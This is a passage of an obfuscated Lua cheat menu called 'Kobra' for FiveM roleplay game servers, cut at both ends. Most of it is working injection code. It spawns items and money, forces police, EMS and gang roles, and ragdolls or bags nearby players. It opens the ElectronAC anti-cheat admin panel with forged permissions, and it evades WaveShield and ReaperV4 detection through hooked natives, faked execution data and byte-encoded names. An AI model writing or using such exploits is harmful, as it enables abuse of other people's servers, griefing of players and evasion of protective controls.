                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v640,v642,v640,v642));end);if  not v643 then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v644);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v640),"itemCount =",tostring(v642));v12:Notify("error","Kobra","String format failed — check console",11166 -7166 );else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();end});end local v291=GetResourceState("scripts")=="started" ;local v292=GetResourceState("framework")=="started" ;if (v291 or v292) then local v580=0;local v581;while true do if (v580==(0 + 0)) then v581=(v291 and "scripts") or "framework" ;v97({type="button",label="COMPLETE COMMS",onSelect=function() v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",7436 -4436 );MachoInjectResourceRaw(v581,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v97({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v806=0 -0 ;while true do if (v806==0) then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then v12:Notify("Setjob","Kobra","Your job has been set to police",7129 -4129 );MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="POLICE JOB (2)",onSelect=function() v12:Notify("Setjob","Kobra","You are now Police",4991 -(761 + 1230) );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v97({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v645) if v645 then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",4000);v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);else v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",4000);v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);end end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v646) if v646 then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);else print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Force Gang",onSelect=function() local v647="";local v648=194 -(80 + 113) ;v12:HideUI();v60("Gang Name","",function(v732) if (v732 and (v732~="")) then v647=v732;end end,"typeable");Wait(1251 + 1049 );v60("Gang Rank","",function(v733) if (v733 and (v733~="")) then v648=tonumber(v733) or 1 ;end end,"typeable");Wait(671 + 329 );local v649=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;local v650=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v647,v648);v48(v649,v650);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",4000);end});end if (GetResourceState("framework")=="started") then v97({type="button",label="Give Item #2",onSelect=function() v12:HideUI();local function v651(v734,v735) local v736=nil;local v737=false;v60(v734,v735 or "" ,function(v807) v736=v807;v737=true;end,"typeable");while  not v737 do Wait(0 + 0 );end return v736;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v652=v651("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v652));if ( not v652 or (v652=="")) then local v808=0 -0 ;while true do if (v808==(1 + 0)) then v12:ShowUI();return;end if (v808==(0 + 0)) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",4243 -(965 + 278) );v808=1730 -(1391 + 338) ;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v653=v651("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v653));local v654=tonumber(v653);if ( not v654 or (v654<(2 -1))) then local v809=0 + 0 ;while true do if (v809==0) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v654=1 -0 ;break;end end end if (v654>(32193 + 67807)) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v654=101408 -(496 + 912) ;end v652=tostring(v652 or "" );v654=tonumber(v654 or 1 );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v652);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v654);local v655,v656=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v652,v654));end);if  not v655 then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v656);v12:Notify("error","Kobra","String format failed — check console",13170 -9170 );else local v810=0 + 0 ;while true do if (v810==(0 -0)) then print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",5330 -(1190 + 140) );break;end end end v12:ShowUI();end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v97({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() local v657=0 + 0 ;while true do if (v657==0) then print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);break;end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Set Chat Tag",onSelect=function() local v658=0;local v659;local v660;local v661;local v662;while true do if (v658==(718 -(317 + 401))) then v12:HideUI();v659=nil;function v659(v963,v964) local v965=nil;local v966=false;v60(v963,v964 or "" ,function(v1036) v965=v1036;v966=true;end,"typeable");while  not v966 do Wait(949 -(303 + 646) );end return v965;end v660=v659("Chat Tag Name","");v658=3 -2 ;end if (v658==1) then if ( not v660 or (v660=="")) then local v1037=1732 -(1675 + 57) ;while true do if (v1037==0) then v12:ShowUI();return;end end end Wait(500);v661=v659("Tag Color (R, G, B)","0, 255, 0");if ( not v661 or (v661=="")) then v661="255, 255, 255";end v658=2 + 0 ;end if ((4 -2)==v658) then Wait(63 + 437 );v662=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v662,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v660,v661));v12:ShowUI();break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="POLICE JOB (3)",onSelect=function() local v663=0;while true do if (v663==(977 -(338 + 639))) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="EMS JOB (1)",onSelect=function() MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);end});end if (GetResourceState("ElectronAC")=="started") then v97({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v97({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v60("Choose Menu Key","",function(v489) for v582,v583 in pairs(v44) do if (v583:lower()==v489:lower()) then v23=v583;Wait(629 -(320 + 59) );v12:ShowUI();return;end end end,"keybind");local v293=0 + 0 ;local v294=852 -(628 + 104) ;while true do Wait(0);if v32 then local v664=v38[v39];if IsControlJustReleased(0 -0 ,14) then local v811=1891 -(439 + 1452) ;while true do if (v811==(1947 -(105 + 1842))) then v39=(v39% #v38) + (4 -3) ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));break;end end end if IsControlJustReleased(0 -0 ,72 -57 ) then local v812=0;while true do if (0==v812) then v39=((v39-(1 + 1))% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));break;end end end if (v664=="Shoot Weapon") then if IsDisabledControlJustPressed(0 -0 ,23 + 21 ) then v34=((v34-(1166 -(274 + 890)))% #v36) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end if IsDisabledControlJustPressed(0,32 + 6 ) then v34=(v34% #v36) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end elseif (v664=="Spawn Car") then if IsDisabledControlJustPressed(0,24 + 20 ) then v35=((v35-(2 + 0))% #v37) + (1 -0) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end if IsDisabledControlJustPressed(819 -(731 + 88) ,38) then local v1117=0 + 0 ;while true do if (v1117==(0 + 0)) then v35=(v35% #v37) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end end if IsDisabledControlPressed(0,34 -10 ) then local v813=v664;if (v813=="Shoot Weapon") then local v967=0;local v968;while true do if ((2 -1)==v967) then if (v968~=v33) then v33=v968;print(("weapon: %s, LastWeaponFired: %s"):format(v968,v33));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1512=0 -0 ;local v1513;local v1514;local v1515;local v1516;local v1517;local v1518;local v1519;local v1520;local v1521;local v1522;while true do if (v1512==(10 -5)) then v1517=1000;v1518=v1514 + (v1516 * v1517) ;v1519=PlayerPedId();v1512=6 + 0 ;end if (v1512==4) then v1514=GetCamCoord(_G.KobraFreecamObject);v1515=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1516=v1513(v1515);v1512=1 + 4 ;end if (v1512==(0 + 0)) then v1513=nil;function v1513(v1601) local v1602=158 -(139 + 19) ;local v1603;local v1604;local v1605;while true do if (v1602==(1 + 0)) then v1605=math.abs(math.cos(v1604));return vector3( -math.sin(v1603) * v1605 ,math.cos(v1603) * v1605 ,math.sin(v1604));end if (v1602==(1993 -(1687 + 306))) then v1603=math.rad(v1601.z);v1604=math.rad(v1601.x);v1602=3 -2 ;end end end function hNative(v1606,v1607) local v1608=_G[v1606];if ( not v1608 or (type(v1608)~="function")) then return;end _G[v1606]=function(...) return v1607(v1608,...);end;end v1512=1155 -(1018 + 136) ;end if (v1512==8) then ShootSingleBulletBetweenCoords(v1514.x,v1514.y,v1514.z,v1518.x,v1518.y,v1518.z,14 + 86 ,true,v1520,PlayerPedId(),true,false,439125 -339125 );break;end if (v1512==6) then v1520=GetHashKey(v968);v1521=nil;function v1521(v1609) local v1610={};for v1644=816 -(117 + 698) , #v1609 do v1610[v1644]=string.byte(v1609,v1644);end return table.concat(v1610,",");end v1512=488 -(305 + 176) ;end if (v1512==(1 + 2)) then hNative("GetCurrentPedWeapon",function(v1611,...) return v1611(...);end);hNative("RemoveWeaponFromPed",function(v1612,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1613,...) return v1613(...);end);v1512=3 + 1 ;end if (v1512==7) then v1522=v1521(v968);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1519,v1522));Wait(606 -256 );v1512=8;end if (v1512==(1 + 0)) then hNative("CreateThread",function(v1614,...) return v1614(...);end);hNative("Wait",function(v1615,...) return v1615(...);end);hNative("PlayerPedId",function(v1616,...) return v1616(...);end);v1512=2 -0 ;end if (v1512==(4 -2)) then hNative("GetHashKey",function(v1617,...) return v1617(...);end);hNative("GiveWeaponToPed",function(v1618,...) return v1618(...);end);hNative("SetCurrentPedWeapon",function(v1619,...) return v1619(...);end);v1512=3;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v968   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1357(v1420) local v1421=math.rad(v1420.z);local v1422=math.rad(v1420.x);local v1423=math.abs(math.cos(v1422));return vector3( -math.sin(v1421) * v1423 ,math.cos(v1421) * v1423 ,math.sin(v1422));end function hNative(v1424,v1425) local v1426=0;local v1427;while true do if (v1426==1) then _G[v1424]=function(...) return v1425(v1427,...);end;break;end if (v1426==0) then v1427=_G[v1424];if ( not v1427 or (type(v1427)~="function")) then return;end v1426=1;end end end hNative("CreateThread",function(v1428,...) return v1428(...);end);hNative("Wait",function(v1429,...) return v1429(...);end);hNative("PlayerPedId",function(v1430,...) return v1430(...);end);hNative("GetHashKey",function(v1431,...) return v1431(...);end);hNative("GiveWeaponToPed",function(v1432,...) return v1432(...);end);hNative("SetCurrentPedWeapon",function(v1433,...) return v1433(...);end);hNative("GetCurrentPedWeapon",function(v1434,...) return v1434(...);end);hNative("RemoveWeaponFromPed",function(v1435,...) return;end);local v1358=GetCamCoord(_G.KobraFreecamObject);local v1359=GetCamRot(_G.KobraFreecamObject,2 -0 );local v1360=v1357(v1359);local v1361=1260 -(159 + 101) ;local v1362=v1358 + (v1360 * v1361) ;local v1363=PlayerPedId();local v1364=GetHashKey(v968);GiveWeaponToPed(v1363,v1364,1229 -974 ,false,true);MachoInjectThread(0,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1364   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(250);ShootSingleBulletBetweenCoords(v1358.x,v1358.y,v1358.z,v1362.x,v1362.y,v1362.z,346 -246 ,true,v1364,v1363,true,false,100000);end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1523=0 + 0 ;local v1524;local v1525;local v1526;local v1527;local v1528;local v1529;local v1530;local v1531;local v1532;local v1533;while true do if (v1523==(25 -17)) then Wait(295 -145 );ShootSingleBulletBetweenCoords(v1525.x,v1525.y,v1525.z,v1529.x,v1529.y,v1529.z,12 + 88 ,true,v1531,v1530,true,false,100000);break;end if (v1523==(270 -(112 + 154))) then hNative("ShootSingleBulletBetweenCoords",function(v1620,...) return v1620(...);end);v1525=GetCamCoord(_G.KobraFreecamObject);v1526=GetCamRot(_G.KobraFreecamObject,2);v1523=5;end if ((6 -3)==v1523) then hNative("SetCurrentPedWeapon",function(v1621,...) return v1621(...);end);hNative("GetCurrentPedWeapon",function(v1622,...) return v1622(...);end);hNative("RemoveWeaponFromPed",function(v1623,...) return;end);v1523=35 -(21 + 10) ;end if (v1523==(1721 -(531 + 1188))) then hNative("PlayerPedId",function(v1624,...) return v1624(...);end);hNative("GetHashKey",function(v1625,...) return v1625(...);end);hNative("GiveWeaponToPed",function(v1626,...) return v1626(...);end);v1523=3 + 0 ;end if (v1523==(664 -(96 + 567))) then function hNative(v1627,v1628) local v1629=_G[v1627];if ( not v1629 or (type(v1629)~="function")) then return;end _G[v1627]=function(...) return v1628(v1629,...);end;end hNative("CreateThread",function(v1630,...) return v1630(...);end);hNative("Wait",function(v1631,...) return v1631(...);end);v1523=2 -0 ;end if (v1523==(0 + 0)) then print("Toogie Doogie");v1524=nil;function v1524(v1632) local v1633=0 -0 ;local v1634;local v1635;local v1636;while true do if (v1633==(1695 -(867 + 828))) then v1634=math.rad(v1632.z);v1635=math.rad(v1632.x);v1633=2 -1 ;end if (v1633==1) then v1636=math.abs(math.cos(v1635));return vector3( -math.sin(v1634) * v1636 ,math.cos(v1634) * v1636 ,math.sin(v1635));end end end v1523=3 -2 ;end if (6==v1523) then v1530=PlayerPedId();v1531=GetHashKey(v968);v1532=nil;v1523=15 -8 ;end if (v1523==(10 -3)) then function v1532(v1637) local v1638={};for v1646=1 + 0 , #v1637 do v1638[v1646]=string.byte(v1637,v1646);end return table.concat(v1638,",");end v1533=v1532(v968);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
